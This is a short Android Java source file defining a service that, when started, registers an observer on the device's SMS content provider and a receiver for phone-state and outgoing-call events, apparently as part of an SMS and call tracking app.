package service;

import receiver.CallReceiver;
import receiver.SmsSentObserver;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

public class ActivateObserver extends Service {

	SmsSentObserver smsSentObserver;
	private static final String TAG = "SMSTRACKER";
    private static final Uri STATUS_URI = Uri.parse("content://sms");
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		smsSentObserver = new SmsSentObserver(new Handler(), this);
	    this.getContentResolver().registerContentObserver(STATUS_URI, true, smsSentObserver);
	    Log.e(TAG, "SMS Listner : "+"Observer Activated");
	    
	    
	    IntentFilter filter = new IntentFilter();

		filter.addAction("android.intent.action.PHONE_STATE");

		filter.addAction("android.intent.action.NEW_OUTGOING_CALL");
		
		registerReceiver(new CallReceiver(), filter);
	    
		return super.onStartCommand(intent, flags, startId);
	}
	
	

}
